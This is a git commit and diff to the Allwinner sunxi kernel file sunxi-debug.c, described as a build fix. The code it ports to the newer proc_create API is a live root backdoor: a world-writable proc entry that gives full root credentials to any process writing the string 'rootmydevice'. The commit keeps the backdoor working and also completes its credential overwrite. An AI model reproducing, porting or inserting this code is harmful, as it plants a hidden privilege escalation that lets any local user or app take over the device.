3380f54f624d67583bf5d2d072922e0dc3cb80eb
Ryan Wong <colorfulshark@gmail.com>
2019-09-05 18:54:12 +0800

    sunxi: fix build errors for sunxi-debug.c
    1. add linux/slab.h
    2. use GLOBAL_ROOT_UID and GLOBAL_ROOT_GID
    3. update create_proc_entry to proc_create
    
    Signed-off-by: Ryan Wong <colorfulshark@gmail.com>

--- arch/arm/mach-sunxi/sunxi-debug.c
+++ arch/arm/mach-sunxi/sunxi-debug.c
@@ -10,6 +10,7 @@
 #include <linux/types.h>
 #include <linux/export.h>
 #include <linux/kthread.h>
+#include <linux/slab.h>
 
 #include <linux/debugfs.h>
 #include <linux/proc_fs.h>//add by fe3o4
@@ -19,9 +20,7 @@
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry * proc_su;
 
-
-static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
- unsigned long count, void *data)
+static int sunxi_proc_su_write(struct file *filp, const char __user *buffer, size_t count, loff_t *data)
 {
 	char *buf;
 	struct cred *cred;
@@ -40,14 +39,14 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 
 	if(!strncmp("rootmydevice",(char*)buf,12)){
 		cred = (struct cred *)__task_cred(current);
-		cred->uid = 0;
-		cred->gid = 0;
-		cred->suid = 0;
-		cred->euid = 0;
-		cred->euid = 0;
-		cred->egid = 0;
-		cred->fsuid = 0;
-		cred->fsgid = 0;
+		cred->uid = GLOBAL_ROOT_UID;
+		cred->gid = GLOBAL_ROOT_GID;
+		cred->suid = GLOBAL_ROOT_UID;
+		cred->sgid = GLOBAL_ROOT_GID;
+		cred->euid = GLOBAL_ROOT_UID;
+		cred->egid = GLOBAL_ROOT_GID;
+		cred->fsuid = GLOBAL_ROOT_UID;
+		cred->fsgid = GLOBAL_ROOT_GID;
 		printk("now you are root\n");
 	}
 
@@ -56,24 +55,26 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 }
 
 
-static int sunxi_proc_su_read(char *page, char **start, off_t off,
- int count, int *eof, void *data)
+static ssize_t sunxi_proc_su_read (struct file * filp, char __user *buffer, size_t count, loff_t *data)
 {
 	printk("sunxi debug: rootmydevice\n");
  	return 0;
 }
 
+static const struct file_operations sunxi_proc_su_fops = {
+        .read       = sunxi_proc_su_read,
+       .write      = sunxi_proc_su_write,
+};
+
+
 static int sunxi_root_procfs_attach(void)
 {
 	proc_root = proc_mkdir("sunxi_debug", NULL);
-	proc_su= create_proc_entry("sunxi_debug", 0666, proc_root);
+	proc_su= proc_create("sunxi_debug", 0666, proc_root, &sunxi_proc_su_fops);
 	if (IS_ERR(proc_su)){
 		printk("create sunxi_debug dir error\n");
 		return -1;
 	}
-	proc_su->data = NULL;
-	proc_su->read_proc = sunxi_proc_su_read;
-	proc_su->write_proc = sunxi_proc_su_write;
 	return 0;
 	
 }
